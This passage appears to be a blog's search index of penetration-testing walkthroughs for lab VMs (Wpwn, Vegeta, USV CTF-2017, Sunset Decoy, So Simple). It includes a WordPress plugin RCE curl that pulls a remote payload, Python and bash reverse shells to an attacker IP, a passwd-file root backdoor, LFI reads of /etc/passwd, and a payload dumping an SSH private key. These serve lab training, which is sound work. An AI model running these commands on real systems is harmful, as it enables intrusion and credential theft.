root.txtWW91J3ZlIGdvdCB0aGUgcm9vdCBDb25ncmF0dWxhdGlvbnMgYW55IGZlZWRiYWNrIGNvbnRlbnQgbWUgdHdpdHRlciBAeTB1c2VmXzExroot@yousef-VirtualBox:/root#Attackers Machine >>â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/y0usef]â””â”€$ echo \"WW91J3ZlIGdvdCB0aGUgcm9vdCBDb25ncmF0dWxhdGlvbnMgYW55IGZlZWRiYWNrIGNvbnRlbnQgbWUgdHdpdHRlciBAeTB1c2VmXzEx\" | base64 -dYou've got the root Congratulations any feedback content me twitter @y0usef_11```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Wpwn", "url": "/posts/Wpwn/", "categories": "Proving Grounds, Play", "tags": "PrivEsc, RFI, Wordpress", "date": "2023-06-14 00:00:00 +0530", "snippet": "### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/Wpwn/Untitled.png)```bashIP : 192.168.249.141```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_G...", "content": "### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/Wpwn/Untitled.png)```bashIP : 192.168.249.141```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/wpwn]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 192.168.249.141Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-26 03:32 EDTStats: 0:00:09 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-ScanNSE Timing: About 0.00% doneNmap scan report for 192.168.249.141Host is up (0.00073s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 59b7dbe0ba6376afd0200311e13c0e34 (RSA)| 256 2e20567584ca35cee36a21321fe7f59a (ECDSA)|_ 256 0d02838b1a1cec0fae74cc7bda12899e (ED25519)80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-title: Site does not have a title (text/html).|_http-server-header: Apache/2.4.38 (Debian)MAC Address: 00:0C:29:E5:DB:C0 (VMware)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/Wpwn/Untitled%201.png)Now I found wordpress in this site so lets dig into it with `wpscan tool` â†’![Untitled](/Vulnhub-Files/img/Wpwn/Untitled%202.png)Now I found an exploit related to social warfare on github â†’[https://github.com/shad0w008/social-warfare-RCE](https://github.com/shad0w008/social-warfare-RCE)I Followed this path and got this â†’![Untitled](/Vulnhub-Files/img/Wpwn/Untitled%203.png)When I loaded this url â†’```bashcurl http://192.168.249.141/wordpress/wp-admin/admin-post.php?rce=id&swp_debug=load_options&swp_url=http://192.168.249.128:8888/rcshell.php```{: .nolineno}![Untitled](/Vulnhub-Files/img/Wpwn/Untitled%204.png)as I got the value of id so lets use this LFI to get a local privilege Escalation â†’ I used python reverse shell command â†’```bashpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.249.128\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'```{: .nolineno}![Untitled](/Vulnhub-Files/img/Wpwn/Untitled%205.png)Lets see wp-config.php file â†’```bashwww-data@wpwn:/var/www/html/wordpress$ cat wp-config.phpcat wp-config.php If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Vegeta", "url": "/posts/Vegeta/", "categories": "Proving Grounds, Play", "tags": "Cryptography, Recon, passwd, PrivEsc", "date": "2023-06-14 00:00:00 +0530", "snippet": "### Letâ€™s find the IP Address first >>![Arp Scan Results That will Tell the IP Address](/Vulnhub-Files/img/Vegeta/Untitled.png)```bashIP : 10.0.2.56```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€...", "content": "### Letâ€™s find the IP Address first >>![Arp Scan Results That will Tell the IP Address](/Vulnhub-Files/img/Vegeta/Untitled.png)```bashIP : 10.0.2.56```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Vegita]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.56Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 11:57 ISTNmap scan report for 10.0.2.56Host is up (0.00050s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 1f3130673f08302e6daee3209ebd6bba (RSA)| 256 7d8855a86f56c805a47382dcd8db4759 (ECDSA)|_ 256 ccdede4e84a891f51ad6d2a62e9e1ce0 (ED25519)80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-title: Site does not have a title (text/html).|_http-server-header: Apache/2.4.38 (Debian)MAC Address: 08:00:27:98:50:DA (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/Vegeta/Untitled%201.png)Lets see the directory or files bruteforcing files â€”>![Untitled](/Vulnhub-Files/img/Vegeta/Untitled%202.png)Lets got to this file â†’![Untitled](/Vulnhub-Files/img/Vegeta/Untitled%203.png)Lets decode this base64 encoded in readable form â†’![Untitled](/Vulnhub-Files/img/Vegeta/Untitled%204.png)Now lets see this data.png file and decode it further since it is qrcode so â†’![Untitled](/Vulnhub-Files/img/Vegeta/Untitled%205.png)Now I got a string â†’ `Password : topshellv` â†’But on further enumeration I find this password as a rabbit hole so lets dig in further through directory or files bruteforcing with rockyou.txt file â†’![Untitled](/Vulnhub-Files/img/Vegeta/Untitled%206.png)Now I got a directory named as `/bulma/` â†’![Untitled](/Vulnhub-Files/img/Vegeta/Untitled%207.png)Now I got a audio file so lets decode it with morse code decoder â†’[https://morsecode.world/international/decoder/audio-decoder-adaptive.html](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)![Untitled](/Vulnhub-Files/img/Vegeta/Untitled%208.png)From decoder I got the credentials â†’```bashU S E R : T R U N K S P A S S W O R D : U $ 3 R```{: .nolineno}Now lets dig into the ssh shell â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Vegeta]â””â”€$ ssh trunks@10.0.2.56trunks@10.0.2.56s password: Linux Vegeta 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sun Jun 28 21:16:00 2020 from 192.168.43.72trunks@Vegeta:~$ whoamitrunkstrunks@Vegeta:~$```{: .nolineno}Now lets the file permissions â†’![Untitled](/Vulnhub-Files/img/Vegeta/Untitled%209.png)Since this file can be modifed as trunks too so lets go and add a new user with root privileges â†’First we need to choose a password, salt it and hash the result. openssl to the rescue.Flags:- -`1`Â what hashing algorithm to use. In our use case it doesnt matter, therefore we use MD5 which should be avoided in real world PT as it is not secure.- -`salt salt`Â string to use as salt. I choose the string salt- `password`Â clear text password we would like to use.```bash$ openssl passwd -1 -salt salt password$1$salt$qJH7.N4xYta3aEG/dfqo/0```{: .nolineno}we need to add some data in order for it to be aligned with theÂ `/etc/passwd`Â format. This is the final result:```bashshiv:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash```{: .nolineno}I named the userÂ `shiv`. now lets write into the `/etc/passwd` file with nano â†’```bashtrunks@Vegeta:~$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:110::/nonexistent:/usr/sbin/nologinavahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologinsshd:x:106:65534::/run/sshd:/usr/sbin/nologintrunks:x:1000:1000:trunks,,,:/home/trunks:/bin/bashsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologintrunks@Vegeta:~$ nano /etc/passwdtrunks@Vegeta:~$ su shivPassword: root@Vegeta:/home/trunks# whoamirootroot@Vegeta:/home/trunks# cd ~root@Vegeta:~# ls -altotal 32drwx------ 3 root root 4096 Jun 28 2020 .drwxr-xr-x 18 root root 4096 Jun 28 2020 ..-rw------- 1 root root 186 Jun 28 2020 .bash_history-rw-r--r-- 1 root root 570 Jan 31 2010 .bashrcdrwxr-xr-x 3 root root 4096 Jun 28 2020 .local-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw-r--r-- 1 root root 1379 Jun 28 2020 root.txt-rw------- 1 root root 1827 Jun 28 2020 .viminforoot@Vegeta:~# cat root.txt , ,'| ,/|.-' \\. .-' ' |. , .-' | /|,' |' / ' | , / ,'/ . | _ / \\`' .-. ,' `. | \\ / \\ / \\ / \\| V | | , ( ) /.--. ''\"/ \"b.`. ,' _.ee'' 6)| ,-' \\\"= --\"\" ) ' /.-' \\ / `---\" .\"|' V E G I I T A \\\"..- .' |. `-__..-',' | _.) ' .-'/ /\\. .--'/----..--------. _.-\"\"-. .-') \\. / _..-' _.-'--. / -'/ \"\"\"\"\"\"\"\"\" ,'-. . `. | ' / / ` `. \\ | | | | | \\ .'\\ | \\ | / ' | ,' . - \\`. | / / / / | | `/\"--. -' /\\ | | \\ \\ / \\ | \t | \\ | \\ .-| | |'Hurray you got rootShare your screenshot in telegram : https://t.me/joinchat/MnPu-h3Jg4CrUSCXJpegNwroot@Vegeta:~#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "USV CTF-2017", "url": "/posts/USV_CTF_2017/", "categories": "Proving Grounds, Play", "tags": "LFI, Recon, hccapx, PrivEsc", "date": "2023-06-14 00:00:00 +0530", "snippet": "## Lets find out the Victim machines IP â¬‡ï¸IP : ![Untitled](/Vulnhub-Files/img/USV_CTF_2017/Untitled.png)```{: .nolineno}IP : 10.0.2.35```{: .nolineno}## Port Scan Results â¤µï¸![Untitled](/Vulnhub-Fil...", "content": "## Lets find out the Victim machines IP â¬‡ï¸IP : ![Untitled](/Vulnhub-Files/img/USV_CTF_2017/Untitled.png)```{: .nolineno}IP : 10.0.2.35```{: .nolineno}## Port Scan Results â¤µï¸![Untitled](/Vulnhub-Files/img/USV_CTF_2017/Untitled%201.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/CTF_2017]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.35Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 14:10 ISTNmap scan report for 10.0.2.35Host is up (0.00057s latency).Not shown: 65526 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp ProFTPD 1.3.5b22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)| ssh-hostkey: | 2048 d71072d8d276b21e28110411b4e2984e (RSA)| 256 b82961bbf18cc464ddf50ea0a22ffdaa (ECDSA)|_ 256 2b7e351042ca082066418880a04f02e6 (ED25519)80/tcp open http Apache httpd|_http-server-header: Apache|_http-title: Site does not have a title (text/html).4369/tcp open epmd Erlang Port Mapper Daemon| epmd-info: | epmd_port: 4369| nodes: |_ ejabberd: 347135222/tcp open jabber ejabberd (Protocol 1.0)| xmpp-info: | STARTTLS Failed| info: | xmpp: | lang: en| server name: localhost| version: 1.0| errors: | host-unknown| host-unknown| (timeout)| auth_mechanisms: | features: | unknown: | stream_id: 13835454705195693772| compression_methods: |_ capabilities: 5269/tcp open jabber ejabberd| xmpp-info: | Ignores server name| info: | xmpp: | version: 1.0| capabilities: | pre_tls: | xmpp: | capabilities: | features: | TLS| post_tls: | xmpp: |_ capabilities: 5280/tcp open ssl/xmpp-bosh?| ssl-cert: Subject: commonName=ejabberd/organizationName=stl.int| Not valid before: 2017-10-23T20:50:49|_Not valid after: 2018-10-23T20:50:49|_ssl-date: TLS randomness does not represent time15020/tcp open http Apache httpd|_http-title: 400 Bad Request|_http-server-header: Apache34713/tcp open unknownMAC Address: 08:00:27:1A:A2:58 (Oracle VirtualBox virtual NIC)Service Info: Host: localhost; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¬‡ï¸![Untitled](/Vulnhub-Files/img/USV_CTF_2017/Untitled%202.png)![Untitled](/Vulnhub-Files/img/USV_CTF_2017/Untitled%203.png)Now letâ€™s try to brute force the password >>From Source code I got a hex encoded script code after decoding it I got this >>![Untitled](/Vulnhub-Files/img/USV_CTF_2017/Untitled%204.png)So this code gives me a formula to calculate password â¬‡ï¸**(stringconcat(password+4469)-234562221224)*1988=1079950212331060**After calculating I got the password =77779673 , Lets use it now â€”> ![Untitled](/Vulnhub-Files/img/USV_CTF_2017/Untitled%205.png)This is our `1st flag âž¡ï¸ Italy:46202df2ae6c46db8efc0af148370a78`Now lets enumerate port 15020 >>while looking into the ssl certificate I got this next flag â¬‡ï¸![Untitled](/Vulnhub-Files/img/USV_CTF_2017/Untitled%206.png)Our next `2nd flag âž¡ï¸ a51f0eda836e4461c3316a2ec9dad743`Further Enumeration I got this >>>![Untitled](/Vulnhub-Files/img/USV_CTF_2017/Untitled%207.png)So lets see the source code âž¡ï¸![Untitled](/Vulnhub-Files/img/USV_CTF_2017/Untitled%208.png)Now lets access the download.php file >>>![Untitled](/Vulnhub-Files/img/USV_CTF_2017/Untitled%209.png)So I see we have LFI but I canâ€™t execute it through web so lets use `curl`.```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/CTF_2017]â””â”€$ curl -d \"image=/etc/passwd\" https://10.0.2.35:15020/blog/download.php -kroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false_apt:x:104:65534::/nonexistent:/bin/falsemessagebus:x:105:109::/var/run/dbus:/bin/falsesshd:x:106:65534::/run/sshd:/usr/sbin/nologinteo:x:1000:1000:teo,,,:/home/teo:/bin/bashmysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/falseproftpd:x:108:65534::/run/proftpd:/bin/falseftp:x:109:65534::/srv/ftp:/bin/falsekevin:x:1001:1001::/home/kevin:epmd:x:110:113::/var/run/epmd:/bin/falseejabberd:x:111:114::/var/lib/ejabberd:/bin/shoana:x:1002:1002::/home/oana:```{: .nolineno}Now I got it , let â€˜s access the flag.txt from kevin home.```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/CTF_2017]â””â”€$ curl -d \"image=/home/kevin/flag.txt\" https://10.0.2.35:15020/blog/download.php -kCroatia: e4d49769b40647eddda2fe3041b9564c```{: .nolineno}Now I downloaded the whole /vault/ directory âž¡ï¸![Untitled](/Vulnhub-Files/img/USV_CTF_2017/Untitled%2010.png)Now lets find the files inside the vault âž¡ï¸```bashfind ./ -type f | grep -v .html```{: .nolineno}![Untitled](/Vulnhub-Files/img/USV_CTF_2017/Untitled%2011.png)Now lets see the cap file â¤µï¸![Untitled](/Vulnhub-Files/img/USV_CTF_2017/Untitled%2012.png)Now lets convert this WPA cap file to the format of hccapx hash format so that we can use our rockyou.zip file decode the hash.![Untitled](/Vulnhub-Files/img/USV_CTF_2017/Untitled%2013.png)![Untitled](/Vulnhub-Files/img/USV_CTF_2017/Untitled%2014.png)so the password is `minion.666` letâ€™s use this to login into the port 15020 with user as `admin`.![Untitled](/Vulnhub-Files/img/USV_CTF_2017/Untitled%2015.png)Source Code â¬‡ï¸![Untitled](/Vulnhub-Files/img/USV_CTF_2017/Untitled%2016.png)`flag 4 âž¡ï¸ Philippines: 551d3350f100afc6fac0e4b48d44d380`> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Sunset : Midnight", "url": "/posts/Sunset-midnight/", "categories": "Proving Grounds, Play, Sunset", "tags": "Password Bruteforce, PrivEsc, SUIDs, mysql, status, Wordpress", "date": "2023-06-14 00:00:00 +0530", "snippet": "## **Description â¤µï¸**>ðŸ’¡ [sunset: midnight](https://vulnhub.com/entry/sunset-midnight,517/) â¤µï¸**Difficulty:** Intermediate**Important!:** Before auditing this machine make sure you add the host \"sun...", "content": "## **Description â¤µï¸**>ðŸ’¡ [sunset: midnight](https://vulnhub.com/entry/sunset-midnight,517/) â¤µï¸**Difficulty:** Intermediate**Important!:** Before auditing this machine make sure you add the host \"sunset-midnight\" to your /etc/hosts file, otherwise it may not work as expected.It is recommended to run this machine in Virtualbox.This works better with ViritualBox rather than VMware{: .prompt-tip }### Letâ€™s find the IP Address first >>![153-1.png](/Vulnhub-Files/img/Sunset-midnight/153-1.png)```bashIP : 10.0.2.5```{: .nolineno}## Port Scan Results âž¡ï¸![153-2.png](/Vulnhub-Files/img/Sunset-midnight/153-2.png)```bashOPEN PORTS >22 SSH80 HTTP3306 mysql```{: .nolineno}## Web Enumeration â¤µï¸![153-3.png](/Vulnhub-Files/img/Sunset-midnight/153-3.png)**After wpscan â†’**![153-4.png](/Vulnhub-Files/img/Sunset-midnight/153-4.png)lets try to brute force the password for sql â†’![153-5.png](/Vulnhub-Files/img/Sunset-midnight/153-5.png)```bashmysql credentials â†’ root : robert```{: .nolineno}from `wordpress_db database` â†’![153-6.png](/Vulnhub-Files/img/Sunset-midnight/153-6.png)```bashusername â†’ adminpassword â†’ $P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/```{: .nolineno}from mysql database â†’![153-7.png](/Vulnhub-Files/img/Sunset-midnight/153-7.png)As I was not able to crack the password so lets change it â†’```sqlCommand â†’update wp_users set user_pass=\"5f4dcc3b5aa765d61d832```{: .nolineno}![153-8.png](/Vulnhub-Files/img/Sunset-midnight/153-8.png)Now my password is password , Lets try it out â†’![153-9.png](/Vulnhub-Files/img/Sunset-midnight/153-9.png)Finally after uploading the shell I got reverse shell â†’![153-10.png](/Vulnhub-Files/img/Sunset-midnight/153-10.png)**Credentials Time â†’**![153-11.png](/Vulnhub-Files/img/Sunset-midnight/153-11.png)```sqljose : 645dc5a8871d2a4269d4cbe23f6ae103```{: .nolineno}![153-12.png](/Vulnhub-Files/img/Sunset-midnight/153-12.png)![153-13.png](/Vulnhub-Files/img/Sunset-midnight/153-13.png)```sqluser.txt â†’ 956a9564aa5632edca7b745c696f6575```{: .nolineno}Lets check the SUIDs and GUIDs files â†’![153-14.png](/Vulnhub-Files/img/Sunset-midnight/153-14.png)![153-15.png](/Vulnhub-Files/img/Sunset-midnight/153-15.png)![153-16.png](/Vulnhub-Files/img/Sunset-midnight/153-16.png)Now I have to Abuse the SUID commands â†’![153-17.png](/Vulnhub-Files/img/Sunset-midnight/153-17.png)![153-18.png](/Vulnhub-Files/img/Sunset-midnight/153-18.png)![153-19.png](/Vulnhub-Files/img/Sunset-midnight/153-19.png)```bashroot.txt â†’ db2def9d4ddcb83902b884de39d426e6```{: .nolineno}---> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Sunset Decoy", "url": "/posts/Sunset-Decoy/", "categories": "Proving Grounds, Play, Sunset", "tags": "Public Exploit, chrootkit, fcrackzip, hashcat, vim, PrivEsc", "date": "2023-06-14 00:00:00 +0530", "snippet": "### Lets check the IP address first â€”>![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled.png)```bashIP : 10.0.2.49```{: .nolineno}## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving...", "content": "### Lets check the IP address first â€”>![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled.png)```bashIP : 10.0.2.49```{: .nolineno}## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Decoy]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.49Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-06 10:50 ISTNmap scan report for 10.0.2.49Host is up (0.00093s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 a9b53e3be374e4ffb6d59ff181e7a44f (RSA)| 256 cef3b3e70e90e264ac8d870f1588aa5f (ECDSA)|_ 256 66a98091f3d84b0a69b000229f3c4c5a (ED25519)80/tcp open http Apache httpd 2.4.38|_http-title: Index of /| http-ls: Volume /| SIZE TIME FILENAME| 3.0K 2020-07-07 16:36 save.zip|_|_http-server-header: Apache/2.4.38 (Debian)MAC Address: 08:00:27:BA:A7:50 (Oracle VirtualBox virtual NIC)Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%201.png)Now lets brute force the password of zip file with `fcrackzip` tool âž¡ï¸![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%202.png)Got the password : `manuel`Now Lets see what I got â†’![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%203.png)Now lets decrypt the hash from shadow file with `hashcat` tool âž¡ï¸![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%204.png)Now I got the credentials of user â†’ ```bash296640a3b825115a47b68fc44501c828:$6$x4sSRFte6R6BymAn$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us.:18450:0:99999:7:::password : server```{: .nolineno}Now letâ€™s SSH into it âž¡ï¸![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%205.png)Since it is running rbash so I need to convert it to bash for that lets see what I got â€”>![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%206.png)Lets execute `honeypot.decoy` which have root privileges â€”>![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%207.png)Lets run Leave a note command with runs on vim I think so , which that I can change the shell âž¡ï¸![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%208.png)Now lets also set the PATH file â€”>![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%209.png)```bash296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ cat user.txt 35253d886842075b2c6390f35946e41f296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$```{: .nolineno}Now lets enumerate freely â€”>![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%2010.png)Lets check the logs file â€”>![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%2011.png)here I find extraction of `chkrootkit` which works as Antivirus purpose and wait I also found AV launch option in `honeypot.decoy` file so lets execute it â†’![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%2012.png)Now I see it is executing the chkrootkit as root Lets find an exploit related to it â€”>![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%2013.png)After reading it I got the steps to perform this exploitation â†’![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%2014.png)![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%2015.png)```bash296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ echo \"bash -c 'bash -i >& /dev/tcp/10.0.2.27/4444 0>&1'\" > /tmp/update296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ chmod +x /tmp/update296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$```{: .nolineno}Lets wait for cronjob to execute and wait for nc respomse â†’![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%2016.png)```bashroot@60832e9f188106ec5bcc4eb7709ce592:~# cat root.txt\tcat root.txt ........::::::::::::.. .......|...............::::::::........ .:::::;;;;;;;;;;;:::::.... . \\ | ../....::::;;;;:::::....... . ........... / \\\\_ \\ | / ...... . ........./\\...:::../\\\\_ ...... ..._/' \\\\\\_ \\###/ /\\_ .../ \\_....... _//.::::./ \\\\\\ _ .../\\ /' \\\\\\\\#######// \\/\\ // \\_ ....//// _/ \\\\\\\\ _/ \\\\\\ / x \\\\\\\\###//// \\//// \\__ _///// ./ x \\\\\\/ \\/ x X \\////// \\///// / XxX \\\\/ XxX X //// x-----XxX-------------|-------XxX-----------*--------|---*-----|------------X-- X _X * X ** ** x ** * X _X _X x * x X_1c203242ab4b4509233ca210d50d2cc5Thanks for playing! - Felipe Winsnes (@whitecr0wz)root@60832e9f188106ec5bcc4eb7709ce592:~#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "So Simple", "url": "/posts/So-Simple/", "categories": "Proving Grounds, Play", "tags": "LFI, PrivEsc, Public Exploit, service, Wordpress", "date": "2023-06-14 00:00:00 +0530", "snippet": "Description â¤µï¸ ðŸ’¡ So Simple : 1 â¤µï¸This is an easy level VM with some rabbitholes. Enumeration is key to find your way in. There are three flags (2 user and 1 root flag).The VM is tested on Virtualb...", "content": "Description â¤µï¸ ðŸ’¡ So Simple : 1 â¤µï¸This is an easy level VM with some rabbitholes. Enumeration is key to find your way in. There are three flags (2 user and 1 root flag).The VM is tested on Virtualbox. After the startup it shows the IP address.Share your rootflag with me on Twitter: @roelvb79Good luck and have fun!This works better with VirtualBox rather than VMwareLetâ€™s find the IP Address firstÂ Â»IP : 10.0.2.4Port Scan Results âž¡ï¸OPEN PORTS &gt;22 SSH80 HTTPWeb Enumeration â¤µï¸Source code snap of http://10.0.2.4:80/ â†’Directory / Files Bruteforcing â†’with WPScan Results â†’max : opensesameAfter some recon I got it â†’Following This I got this â†’Now lets try reverse shell â†’After trying So many reverse Shell code I failed so lets try to access the rsa kye of max â†’payload.txt â†’ &lt;pre&gt;system('cat /home/max/.ssh/id_rsa');&lt;/pre&gt;I got it â†’Now lets try ssh to max â†’user.txt â†’ 073dafccfe902526cee753455ff1dbb0Lets see what max can do lead me to root or closer to that â†’Now lets see how steven can lead me to root shell â†’user2.txt â†’ b662b31b7d8cb9f5cdc9c2010337f9b8DONE Did it â†’ If you have any questions or suggestions, please leave a comment below.Thank You !" }, { "title": "PxExp", "url": "/posts/Pxexp/", "categories": "Proving Grounds, Play", "tags": "Password Bruteforce, PrivEsc, mysql", "date": "2023-06-14 00:00:00 +0530", "snippet": "### Letâ€™s find the IP Address first 